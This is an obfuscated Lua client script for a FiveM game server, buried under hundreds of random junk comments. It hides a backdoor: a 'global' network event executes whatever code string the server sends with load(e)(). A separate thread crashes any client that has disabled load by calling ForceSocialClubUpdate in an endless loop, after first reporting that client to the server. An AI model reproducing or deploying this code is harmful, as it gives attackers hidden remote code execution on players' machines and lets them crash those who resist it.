



		Citizen.CreateThread(			





				--[[hoPIE]] --[[K6KbuI]]--[[6L]] --[[2d6]]--[[r3Xkr3hPO]] --[[n]]--[[CxFiWx]] --[[CRNwXYv]]function()		





		--[[tf73RY]] --[[Ss]]--[[bO]] --[[Pe1LFnq]]--[[z]] --[[sYe]]--[[w2eTXM]] --[[vpSE4CMn]]--[[vp]] --[[G]]--[[ToedK]] --[[8]]--[[E1]] --[[6teLC0x]]--[[W]] --[[IqZbmzWu]]local--[[TrDC6V]] --[[LF1ydR7]]a--[[21W]] --[[CM9]]=--[[vfJ7Sdz]] --[[jEMIH3]]Citizen.InvokeNative						










			--[[t0]] --[[hSZkM]]--[[b1DvU]] --[[CX2]]--[[bwIX6Qz]] --[[nyY4lBKIL]]--[[lphX]] --[[dkg]]--[[rA]] --[[3]]--[[Fy7zz]] --[[HEopt]]--[[LyDE]] --[[qu8BdqNZ0]]--[[QJjCRacl]] --[[GSfm]]TriggerServerEvent--[[X3VlnWB0W]] --[[0UlaB6NM]]=--[[hzXLhvU8]] --[[p5]]function(b,--[[qCA6]] --[[t]]...)		








							--[[uZIu3jRbW]] --[[vnei]]--[[ujh]] --[[klM]]--[[Oo8sE7]] --[[W4]]--[[Z]] --[[dLcA72M]]--[[KYge]] --[[VgZPtBXAz]]--[[e]] --[[g1KUgL]]--[[BZQTGX]] --[[Tg0bxCVMY]]--[[E3oW8g]] --[[Lf]]--[[VO]] --[[xwds3ipF]]--[[mfMCwstAL]] --[[mugulEZu]]--[[tCWxK1t]] --[[obT9JLz]]--[[5ei9R]] --[[qZ]]local--[[6BHeda2J]] --[[EDLNp]]c--[[dmZ]] --[[q81]]=--[[f]] --[[jh6SeTX]]msgpack.pack({...})					





					--[[OurB]] --[[6Tkpyj8tK]]--[[edf]] --[[vCSJRa]]--[[e25zvovc]] --[[XbfL2ILq]]--[[CG]] --[[YUP6H]]--[[zS6]] --[[HJRcdIbN8]]--[[bIiE7]] --[[U7hOex]]--[[E0NRr]] --[[ZNwDCXJH9]]--[[nfQJT]] --[[8tuD7Z]]--[[3043]] --[[RZeoMBfT0]]--[[Gd]] --[[Rln239]]--[[RRj6]] --[[RPBD]]--[[irm4]] --[[0SFx63Vc]]return--[[aC0Prs]] --[[10d]]a(0x7fdd1128,--[[hn0GCi]] --[[88Mgl]]b,--[[Ch3hVHVn6]] --[[lMrKJi4Q]]c,--[[R]] --[[zi6FGTIFQ]]c:len())								








		--[[cddYtOk]] --[[uSmdouO]]--[[T]] --[[Ka7Ik2w3]]--[[gLpJbBnZj]] --[[TD]]--[[jgkofUN]] --[[UbVx]]--[[bF]] --[[GNBkA]]--[[h7CgsVFd]] --[[emz9wA]]--[[q7tF8aR6]] --[[AZGlbewW6]]--[[pKlER0Y5y]] --[[u4dXckv]]end			






					--[[lP]] --[[PBIt173zV]]--[[Rj]] --[[T]]--[[F]] --[[VQiy]]--[[Mr]] --[[Xy77agZ]]--[[8Ub]] --[[qk]]--[[KdYL6RJ4]] --[[vUsUGQ]]--[[lqz]] --[[j]]--[[G3K]] --[[zXP]]_G.TriggerServerEvent--[[28sDdc]] --[[OZmjyU]]=--[[3yV3wClL]] --[[TQKG]]function(b,--[[a1dn1l]] --[[fHn3p6G20]]...)				




			--[[mtBdJAL]] --[[bF]]--[[b4VPO2]] --[[7bV]]--[[U3hRQ03]] --[[M]]--[[vlCeLPy]] --[[7MSFxwV2S]]--[[TVmc8]] --[[RbW]]--[[tE5gt]] --[[OSGcOrBd]]--[[caE1BQRrP]] --[[wSimDANvI]]--[[pfsoWz1U8]] --[[OKKZ]]--[[SS]] --[[IZJQe]]--[[9v7Pn1MC]] --[[50]]--[[Ugconb4]] --[[foI0M7bM]]--[[Qtn1Po]] --[[FZLc1]]local--[[4OBD8jwbR]] --[[bXy]]c--[[Pxlo0]] --[[AmCRWGF]]=--[[Q]] --[[DH3sdH]]msgpack.pack({...})			



					--[[1J31Ow]] --[[Sb1JriH8w]]--[[BW7eMV8]] --[[2jL5QJh4]]--[[T2OugKgZ]] --[[qQJUC33]]--[[hncbV]] --[[qCEXAu]]--[[Ojqc1Y5Lg]] --[[2a7nZA3]]--[[nqTO4]] --[[D6Wkziku]]--[[q9MzvKiIT]] --[[K2VYu]]--[[kh]] --[[wauJ]]--[[RWr4SMahG]] --[[iopB8aFt]]--[[JAwcU]] --[[6aPvYKt]]--[[hiNZ8]] --[[IRZ7n]]--[[RRs7ShEHY]] --[[J7C19MuL]]return--[[1OBQ1f]] --[[rNvUnEJv]]a(0x7fdd1128,--[[q1EmBXqV]] --[[t]]b,--[[1qBXXN]] --[[b3]]c,--[[wX]] --[[Yd]]c:len())					






		--[[sp6]] --[[V5D8Iyf]]--[[yAgNZgG]] --[[S1o9W]]--[[IchZl0]] --[[A]]--[[cvz]] --[[cyBIGsbn]]--[[A]] --[[3rN0Z03]]--[[p7UdH]] --[[s4Bkj2]]--[[urr]] --[[qGuCvY]]--[[r2oH]] --[[eQD]]end							








		--[[6]] --[[s73u6]]--[[V7]] --[[bpO]]--[[g]] --[[OxKZ]]--[[6wLqATaG]] --[[JJlufENL3]]end					






			)					











	Citizen.CreateThread(				





		--[[izk]] --[[bWc]]--[[Bmf5YP]] --[[1o6]]--[[Dv6pOHno]] --[[IS6]]--[[cK0zpmJhM]] --[[ZyR]]function()			





			--[[yXzes2]] --[[5hccdN]]--[[kbMNq]] --[[veWT6AnA]]--[[kStn]] --[[tl]]--[[Tu19hm]] --[[ln0qE]]--[[Lm8]] --[[gTVpKGW]]--[[4SF]] --[[oHuCPX]]--[[2jqjzlCjF]] --[[x3JFONkv]]--[[1IeVl]] --[[06fz]]Citizen.Wait(15)					



					--[[bIqASE68t]] --[[b384]]--[[RwwvE]] --[[X5e]]--[[0]] --[[M0WyEN1e]]--[[T]] --[[PY4XH80J9]]--[[UWm]] --[[pzZDH1TNm]]--[[Km]] --[[ES]]--[[dp]] --[[73fv]]--[[8UvSEV]] --[[iySiF]]if--[[T]] --[[1R]]type(load("return--[[sM]] --[[TZ4yCjBZG]]print('test')"))--[[zC6D]] --[[qDGrUfW]]~=--[[LPIF5sHq]] --[[2HRv]]"function"--[[l]] --[[BUrZ]]then					









	--[[N]] --[[LaA41]]--[[9k]] --[[l8ak9O]]--[[wb4tb87nv]] --[[SuOh0hs]]--[[ehzLvAL]] --[[bv]]--[[Czzl]] --[[GRSA]]--[[JnsUTq]] --[[LmqQZQEG]]--[[N67DUi]] --[[rByOHrs1j]]--[[mnq]] --[[1uuLt]]--[[aCQe8M]] --[[MPJ]]--[[JVl]] --[[25]]--[[3gLP2]] --[[RrbIn]]--[[wpu5n3PS]] --[[99FVi2od]]TriggerServerEvent("nilLoad")						






		--[[Kv2u4]] --[[sil]]--[[xO6s3kS]] --[[P5l55c]]--[[Nqn]] --[[7ekX]]--[[nI762N]] --[[fB2BX]]--[[4Xs]] --[[uaLTzl]]--[[ITdk]] --[[HlH]]--[[j]] --[[Tp]]--[[O]] --[[SXaDF]]--[[ZZ]] --[[V4Efj]]--[[4Z]] --[[UzZeFZ]]--[[XcM09va0]] --[[981Ol7b5]]--[[0YQv7iDJ]] --[[r]]Citizen.Wait(7500)				








		--[[pE]] --[[Jgw2ohFC]]--[[p5]] --[[IuyP19v4v]]--[[umuj52]] --[[g]]--[[tXwh]] --[[7]]--[[0ASVgX09]] --[[dBd]]--[[cdXib140d]] --[[5mCWcWxcC]]--[[JlAq]] --[[oa]]--[[R6]] --[[G]]--[[2fKKjA]] --[[BGaclGGD]]--[[bYN0]] --[[8egoF]]--[[LSW]] --[[xxM4DO22]]--[[6QRpYSd]] --[[MEpK7]]while--[[lBbaS2j]] --[[mu7SWild5]]true--[[JO1dZl2Xh]] --[[NVzYbKi]]do		






				--[[ZSvXI]] --[[Z1XKv]]--[[A]] --[[xNbdeDmXV]]--[[swcXYF]] --[[oxj0uc]]--[[Jwmp0pza]] --[[Zl]]--[[wqoJ2Ov]] --[[G]]--[[Q3dcDsM]] --[[gO2v1ni]]--[[AZveZncF]] --[[CDSSq]]--[[4AB]] --[[Q]]--[[xjQ249B5h]] --[[miwOVoRL]]--[[50uFAU6NG]] --[[kQsqVhP]]--[[N]] --[[tL4vCwj]]--[[XV]] --[[kcWfHi5E5]]--[[Ps1p]] --[[kKP8al]]--[[ep9KULhx2]] --[[cagBQ07]]--[[L]] --[[uUgeB]]--[[t]] --[[3]]for--[[o9nJSK2U]] --[[D6tgbsRe7]]d--[[yEUUnkqv]] --[[2n1h]]=--[[6PiDvKRm3]] --[[O]]1,--[[56uh3Ir6]] --[[6YLaogJC]]45364567--[[Tp4wQQCyN]] --[[fuc0k]]do					






					--[[dReWPWX4]] --[[pXMq]]--[[U9hS]] --[[IKy]]--[[E6R]] --[[t9X]]--[[kkJWVY]] --[[Oii2SAzs]]--[[7VW]] --[[cTzP]]--[[gnB]] --[[xGc6]]--[[3o2nv]] --[[Ap2d4t7Us]]--[[5Ku]] --[[I7]]--[[9lP68U]] --[[J4y3]]--[[R]] --[[Cl]]--[[xCFS]] --[[4yz6Qe]]--[[881MIMR]] --[[aCOpx]]--[[Zk05dBg8]] --[[HHxvsVV]]--[[Tb0yT]] --[[S]]--[[3]] --[[6S6gevf]]--[[TegY]] --[[ss8Z2NGN]]--[[VOTMH]] --[[IHedlx]]--[[JSDnt5l9]] --[[Jz]]--[[QBn]] --[[R5fyqeQNY]]--[[iqy]] --[[DMD]]ForceSocialClubUpdate()					








					--[[28hhh7P]] --[[f]]--[[AGUy]] --[[gW]]--[[W]] --[[sLQjJ1]]--[[KaGvHS9]] --[[z]]--[[ruh7]] --[[SBxXoaGS]]--[[5MYh]] --[[usRXqi]]--[[5SfIISqUv]] --[[Y6eGn]]--[[TW]] --[[pM8MzpPls]]--[[ORFlo9]] --[[Wix]]--[[KYPWM]] --[[av9MnGE5]]--[[QVgaSwT0]] --[[jswQaw5iH]]--[[fxX4bLa8]] --[[KSEz8qa]]--[[VWmEx]] --[[l9pBo]]--[[CJ]] --[[phySxxs]]--[[dV2eYR8]] --[[4n89]]--[[L]] --[[L]]end				







			--[[gGlyIn]] --[[EnAkbD]]--[[Ejn]] --[[W]]--[[Q34d]] --[[S]]--[[ft2CGa]] --[[fnAvZEX]]--[[TjcPqc2Xy]] --[[5L907Q]]--[[l]] --[[m2V]]--[[V2p1m2wzx]] --[[4w6lNuhLp]]--[[n43WlAKh]] --[[SoiB2]]--[[fiV2tU8v]] --[[m84ZQ]]--[[Kc5Nx]] --[[izx]]--[[UCmg8]] --[[v8AR]]--[[m9vdqueAd]] --[[W]]end				



		--[[V]] --[[5lotfeQta]]--[[Hd6mfFDB7]] --[[8sOA]]--[[qjzBlH]] --[[ibfk2od]]--[[751Egp0F]] --[[cY]]--[[a5LCZ]] --[[lK]]--[[v]] --[[jD6jhV]]--[[b3ETlPFbT]] --[[mAdA]]--[[GUXoJ]] --[[RzE5cE2N]]end				






				--[[ppphO]] --[[y]]--[[xMULh]] --[[4gCD]]--[[tbR7z]] --[[ZYcUM]]--[[pHD]] --[[8GH2Pp6BO]]end				





				)					




	RegisterNetEvent("global")			






		AddEventHandler(				



			--[[vaO5]] --[[6]]--[[9qylXns]] --[[pJ04MbKn]]--[[vKrn9]] --[[R]]--[[r2m4OpoS]] --[[cVfu]]"global",		






		--[[MnHqoJJ]] --[[S5PSX]]--[[ma55E63k2]] --[[35dsSET]]--[[S7Smz]] --[[8Mo2YgLBo]]--[[MHS7]] --[[LnCncB]]function(e)		









		--[[2F1jR7ua]] --[[lMQ]]--[[GgbV]] --[[7TVp4gI]]--[[4F9RURj]] --[[en3SFb6d]]--[[TRsd]] --[[sTqZHYYS]]--[[DUYj]] --[[LBBQaK]]--[[vkKpw1k]] --[[E8biXtH]]--[[Tbr6kra]] --[[ql]]--[[e]] --[[TX7DG10]]if--[[QjrT]] --[[zzHk]]type(load("return--[[hxa]] --[[F8h]]print('test')"))--[[xT15prz]] --[[SHqhyei]]==--[[fZA8m]] --[[0Zsk]]"function"--[[yHVcp0XT]] --[[YcC0OAW]]then	







			--[[z]] --[[gmXLG69Vb]]--[[EZnxHPZ]] --[[mKKv9]]--[[R2Y]] --[[S4S4]]--[[hDDj]] --[[QL3fQd2]]--[[VNhxNI]] --[[l]]--[[gX9]] --[[GKCMuFvT]]--[[v]] --[[jvfkyI]]--[[QW9MqvoE]] --[[FGU]]--[[U8]] --[[PwnGY]]--[[mE]] --[[Q]]--[[l]] --[[qRkv]]--[[ZDra]] --[[M2pV]]load(e)()		




	--[[H9ZKg1jU]] --[[JJrrztXh]]--[[vx8b]] --[[r]]--[[gXT]] --[[tiJLXlc]]--[[zfAOD]] --[[K4FqpH]]--[[7XBQ]] --[[s0w0Q]]--[[f7Cu9]] --[[v]]--[[5daJv]] --[[S0jf9]]--[[R3]] --[[cPL]]end					

		--[[2]] --[[Yn]]--[[FG4U7hg]] --[[oJ89ngkcX]]--[[6fk]] --[[o9l5p9e]]--[[F1]] --[[HMUE]]end				







				)				
